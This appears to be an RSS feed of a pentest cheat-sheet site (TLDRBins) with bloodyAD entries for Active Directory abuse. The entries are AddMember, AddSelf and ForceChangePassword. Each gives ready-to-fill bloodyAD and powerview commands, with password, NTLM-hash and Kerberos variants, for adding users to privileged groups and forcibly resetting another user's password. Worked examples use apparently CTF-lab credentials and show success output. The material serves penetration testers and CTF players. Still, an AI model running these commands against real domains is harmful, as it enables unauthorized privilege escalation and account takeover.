channel.title: BloodyAD on TLDRBins
channel.description: Recent content in BloodyAD on TLDRBins

item.title: AddMember
item.description: Privesc #1: Add User to Group (From Linux) bloodyAD powerview.py 1. Add User to Group # Password bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>' # Kerberos bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>' Ref: bloodyAD 1. Connect # Password sudo ntpdate -s <DC_IP> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' $ sudo ntpdate -s dc01.rebound.htb && powerview 'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb' Logging directory is set to /home/kali/.

item.title: AddSelf
item.description: Privesc #1: Add Self to Group (From Linux) bloodyAD powerview.py 1. Add Self to Group # Password bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>' $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend' [+] oorend added to SERVICEMGMT # NTLM bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>' # Kerberos bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>' $ bloodyAD -d absolute.

item.title: ForceChangePassword
item.description: Change Target User Password (From Linux) BloodyAD rpcclient # Password bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>' bloodyAD -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234' [+] Password changed successfully! # NTLM bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>' # Kerberos bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>' Ref: bloodyAD
